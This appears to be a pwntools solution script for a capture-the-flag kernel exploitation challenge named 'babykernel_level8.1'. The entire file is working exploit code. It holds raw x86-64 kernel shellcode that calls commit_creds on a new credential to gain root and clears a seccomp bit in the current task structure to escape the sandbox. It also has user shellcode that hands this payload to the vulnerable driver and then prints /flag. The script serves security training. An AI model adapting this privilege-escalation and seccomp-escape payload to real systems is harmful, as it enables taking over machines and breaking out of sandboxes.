from pwn import *

context.arch = 'amd64'

#comit_cred
#kernel_shellcode = b"\x48\x31\xff\x48\xc7\xc0\xd0\x90\x08\x81\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x90\x8d\x08\x81\xff\xd0"
#escape_seccomp
#kernel_shellcode += b"\x65\x48\x8b\x04\x25\x00\x00\x00\x00\x48\x81\x20\xff\xfe\xff\xff\x31\xc0\xc3"
kernel_shellcode = b"\x48\x31\xff\x48\xc7\xc0\xd0\x90\x08\x81\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x90\x8d\x08\x81\xff\xd0\x65\x48\x8b\x04\x25\x00\x5d\x01\x00\x48\x81\x20\xff\xfe\xff\xff\x31\xc0\xc3"
shellcode = shellcraft.amd64.write(3,kernel_shellcode,len(kernel_shellcode))
shellcode += shellcraft.amd64.linux.cat("/flag", 1)

#shellcode += shellcraft.amd64.opwn()

user_shellcode = asm(shellcode)

p = process("/challenge/babykernel_level8.1")
for i in range(13):
    print(p.recvline())

p.sendline(user_shellcode)

for i in range(60):
    print(i,p.recvline())



